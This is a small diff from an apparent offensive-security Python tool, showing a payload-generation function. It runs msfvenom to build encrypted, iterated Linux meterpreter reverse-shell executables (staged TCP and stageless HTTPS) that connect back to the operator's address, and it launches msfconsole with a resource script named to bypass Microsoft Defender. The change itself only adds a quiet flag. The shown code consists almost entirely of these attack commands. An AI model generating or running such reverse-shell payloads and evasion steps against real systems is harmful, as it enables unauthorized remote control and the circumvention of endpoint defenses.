@@ -51,7 +51,7 @@ def generate_payloads(interface):
 
     os.system(f"msfvenom -p linux/x64/meterpreter/reverse_tcp -i 3 --encrypt aes256 --smallest LHOST={ip} LPORT=5001 -f elf > linux_x64_meterpreter_tcp_staged_{ip}_5001.elf")
     os.system(f"msfvenom -p linux/x64/meterpreter_reverse_https -i 3 --encrypt aes256 --smallest LHOST={ip} LPORT=5000 -f elf > linux_x64_meterpreter_https_stageless_{ip}_5000.elf")
-    os.system(f"msfconsole -r ../msf-resource/bypass-defender.rc")
+    os.system(f"msfconsole -q -r ../msf-resource/bypass-defender.rc")
 
 
     click.secho("[+] Payloads generated successfully!", fg="green", bold=True)
